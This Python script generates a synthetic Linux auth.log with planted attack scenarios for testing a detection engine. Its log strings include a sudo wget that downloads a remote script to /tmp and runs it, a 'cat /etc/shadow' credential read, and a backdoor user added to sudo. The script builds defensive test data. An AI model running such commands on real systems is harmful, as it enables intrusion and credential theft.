"""
Generate a realistic synthetic Linux auth.log with planted attack scenarios.

Normal background: admins logging in with keys, sudo for routine tasks, cron sessions.
Planted scenarios (what the engine should find):
  1. SSH brute force against 'admin' that eventually succeeds, then persistence:
     new user, added to sudo, suspicious sudo download from /tmp
  2. Password spraying across many accounts from another address
  3. Username enumeration from a scanner
  4. Direct root login
  5. Repeated sudo password failures by a local user

IPs are from RFC 5737 documentation ranges. Seeded, so output is identical each run.

Usage:
    python src/generate_auth_log.py                 # writes data/auth.log
    python src/generate_auth_log.py --out /tmp/test.log --seed 3
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
HOST = "web-prod-01"
ADMINS = {"priya": "192.0.2.21", "liam": "192.0.2.22", "deploy": "192.0.2.30"}


class LogWriter:
    def __init__(self, rng: random.Random):
        self.rng = rng
        self.lines: list[tuple[datetime, str]] = []

    def add(self, when: datetime, process: str, message: str) -> None:
        pid = self.rng.randint(1000, 65000)
        stamp = f"{when:%b} {when.day:>2} {when:%H:%M:%S}"
        self.lines.append((when, f"{stamp} {HOST} {process}[{pid}]: {message}"))

    def ssh_fail(self, when, user, ip, invalid=False):
        port = self.rng.randint(30000, 65000)
        if invalid:
            self.add(when, "sshd", f"Invalid user {user} from {ip} port {port}")
        prefix = "invalid user " if invalid else ""
        self.add(when + timedelta(seconds=1), "sshd", f"Failed password for {prefix}{user} from {ip} port {port} ssh2")

    def ssh_ok(self, when, user, ip, method="publickey"):
        port = self.rng.randint(30000, 65000)
        self.add(when, "sshd", f"Accepted {method} for {user} from {ip} port {port} ssh2")
        self.add(when, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)")

    def sudo(self, when, user, command, pwd="/home"):
        self.add(when, "sudo", f"   {user} : TTY=pts/0 ; PWD={pwd} ; USER=root ; COMMAND={command}")


def generate(seed: int) -> list[str]:
    rng = random.Random(seed)
    log = LogWriter(rng)
    start = datetime(2026, 9, 21, 0, 0)

    # --- background activity over three days -----------------------------------
    for day in range(3):
        base = start + timedelta(days=day)
        for user, ip in ADMINS.items():
            log.ssh_ok(base + timedelta(hours=8, minutes=rng.randint(0, 50)), user, ip)
            for _ in range(rng.randint(1, 3)):
                cmd = rng.choice(["/usr/bin/systemctl restart nginx", "/usr/bin/apt update",
                                  "/usr/bin/journalctl -u nginx", "/usr/bin/tail /var/log/nginx/error.log"])
                log.sudo(base + timedelta(hours=rng.randint(9, 16), minutes=rng.randint(0, 59)), user, cmd)
        for hour in range(0, 24, 6):
            log.add(base + timedelta(hours=hour, minutes=17), "CRON",
                    "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
        if rng.random() < 0.7:  # an honest typo
            t = base + timedelta(hours=9, minutes=5)
            log.ssh_fail(t, "liam", ADMINS["liam"])
            log.ssh_ok(t + timedelta(seconds=20), "liam", ADMINS["liam"], "password")

    # --- scenario 1: brute force -> success -> persistence ----------------------
    attacker = "203.0.113.45"
    t = start + timedelta(days=1, hours=2, minutes=11)
    for i in range(14):
        log.ssh_fail(t + timedelta(seconds=i * 9), "admin", attacker)
    t_ok = t + timedelta(seconds=14 * 9 + 5)
    log.ssh_ok(t_ok, "admin", attacker, "password")
    log.sudo(t_ok + timedelta(minutes=2), "admin", "/usr/sbin/useradd -m -s /bin/bash svc-backup")
    log.add(t_ok + timedelta(minutes=2, seconds=1), "useradd",
            "new user: name=svc-backup, UID=1005, GID=1005, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1")
    log.sudo(t_ok + timedelta(minutes=3), "admin", "/usr/sbin/usermod -aG sudo svc-backup")
    log.add(t_ok + timedelta(minutes=3, seconds=1), "usermod", "add 'svc-backup' to group 'sudo'")
    log.sudo(t_ok + timedelta(minutes=5), "admin", "/usr/bin/wget http://198.51.100.99/x.sh -O /tmp/.x.sh", "/tmp")
    log.sudo(t_ok + timedelta(minutes=6), "admin", "/bin/bash /tmp/.x.sh", "/tmp")
    log.sudo(t_ok + timedelta(minutes=8), "admin", "/bin/cat /etc/shadow", "/tmp")

    # --- scenario 2: password spraying ----------------------------------------
    sprayer = "198.51.100.77"
    t = start + timedelta(days=1, hours=13, minutes=40)
    for i, user in enumerate(["priya", "liam", "deploy", "backup", "ubuntu", "admin", "git", "test"]):
        log.ssh_fail(t + timedelta(seconds=i * 50), user, sprayer)

    # --- scenario 3: username enumeration -------------------------------------
    scanner = "203.0.113.200"
    t = start + timedelta(days=2, hours=4, minutes=2)
    for i, user in enumerate(["oracle", "postgres", "pi", "user1", "ftpuser"]):
        log.ssh_fail(t + timedelta(seconds=i * 30), user, scanner, invalid=True)

    # --- scenario 4: root logs in directly ------------------------------------
    log.ssh_ok(start + timedelta(days=2, hours=22, minutes=48), "root", "192.0.2.99", "password")

    # --- scenario 5: sudo password guessing -----------------------------------
    t = start + timedelta(days=2, hours=15, minutes=30)
    for i in range(4):
        log.add(t + timedelta(seconds=i * 20), "sudo",
                "pam_unix(sudo:auth): authentication failure; logname=intern uid=1010 euid=0 "
                "tty=/dev/pts/2 ruser=intern rhost=  user=intern")

    return [line for _, line in sorted(log.lines)]


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate a synthetic auth.log with planted attacks.")
    parser.add_argument("--out", type=Path, default=PROJECT_ROOT / "data" / "auth.log")
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args()
    lines = generate(args.seed)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"Wrote {len(lines)} lines to {args.out}")


if __name__ == "__main__":
    main()
